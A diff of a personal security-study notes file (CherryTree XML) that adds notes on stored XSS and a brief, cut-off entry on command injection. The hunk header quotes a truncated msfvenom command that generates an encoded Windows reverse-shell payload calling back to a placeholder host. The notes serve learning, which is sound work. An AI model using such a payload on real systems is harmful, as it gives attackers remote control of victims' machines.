@@ -7790,7 +7790,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shik
 </rich_text>
       </node>
     </node>
-    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1710373343">
+    <node name="Web Fundamentals" unique_id="251" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1708057899" ts_lastsave="1710545901">
       <node name="Walking an application" unique_id="252" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="152" is_bold="0" foreground="" ts_creation="1708057929" ts_lastsave="1708309278">
         <rich_text>Introduction
 - manually review a web app for security issues
@@ -8055,7 +8055,7 @@ Defeating common SSRF defenses
 - allow list, where all requests get denied unless they appear on a lust or match a particular pattern
 - Open redirect, is an endpoint on the server where the website visitor gets automatically redirected to another website address</rich_text>
       </node>
-      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1710465320">
+      <node name="Cross-site Scripting" unique_id="261" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="153" is_bold="0" foreground="" ts_creation="1710373343" ts_lastsave="1710465363">
         <rich_text>Introduction
 - XSS is based on JS
 - injection attack where malicious JS gets injected into a web app with the intetion of being executed by other users
@@ -8080,7 +8080,8 @@ Reflected XSS
 
 Stored XSS
 - stored on the web application and then gets run when other users visit the site or web
-- redirect to another site, steal the user's session cookie or perf
+- redirect to another site, steal the user's session cookie or perform another action
+- 
 
 DOM Based XSS
 - Documento Object Model
@@ -8091,6 +8092,11 @@ DOM Based XSS
 Blind XSS
 - similar to stored XSS, payload get stored on the website for another user to view
 - gennerally is used a call back - HTTP request, popular tool: XSS Hunter Express</rich_text>
+      </node>
+      <node name="Command Injection" unique_id="262" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="154" is_bold="0" foreground="" ts_creation="1710545901" ts_lastsave="1710546568">
+        <rich_text>Introduction
+- abuse of an app behaviour to execute commands on the OS, using privileges that the app on a device is running
+- also know as Remote Code Execution (</rich_text>
       </node>
     </node>
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
